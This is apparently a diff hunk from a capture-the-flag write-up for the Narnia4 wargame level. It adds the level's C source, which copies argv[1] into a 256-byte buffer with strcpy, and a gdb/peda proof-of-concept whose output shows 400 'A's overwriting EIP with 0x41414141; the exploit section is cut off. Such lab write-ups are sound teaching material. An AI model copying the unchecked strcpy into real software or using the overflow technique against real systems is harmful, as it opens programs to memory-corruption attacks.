@@ -245,9 +245,59 @@ thaenohtai
 ## Narnia4
 ### Source code:
 ```
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
+extern char **environ;
+
+int main(int argc,char **argv){
+    int i;
+    char buffer[256];
+
+    for(i = 0; environ[i] != NULL; i++)
+        memset(environ[i], '\0', strlen(environ[i]));
+
+    if(argc>1)
+        strcpy(buffer,argv[1]);
+
+    return 0;
+}
 ```
 ### PoC:
 ```
+env - gdb ./narnia4
+source /usr/local/peda/peda.py
+b *main
+disassemble *main
+b *main+116
+set args $(python -c 'print "\x41" * 400')
+...snip
+EAX: 0x0
+EBX: 0x0
+ECX: 0xffffdfc0 ("AAAAAA")
+EDX: 0xffffdd2e ("AAAAAA")
+ESI: 0x2
+EDI: 0xf7fc5000 --> 0x1b2db0
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffdcb0 ('A' <repeats 132 times>)
+EIP: 0x41414141 ('AAAA')
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffdcb0 ('A' <repeats 132 times>)
+0004| 0xffffdcb4 ('A' <repeats 128 times>)
+0008| 0xffffdcb8 ('A' <repeats 124 times>)
+0012| 0xffffdcbc ('A' <repeats 120 times>)
+0016| 0xffffdcc0 ('A' <repeats 116 times>)
+0020| 0xffffdcc4 ('A' <repeats 112 times>)
+0024| 0xffffdcc8 ('A' <repeats 108 times>)
+0028| 0xffffdccc ('A' <repeats 104 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x41414141 in ?? ()
 ```
 ### Exploit:
 ```
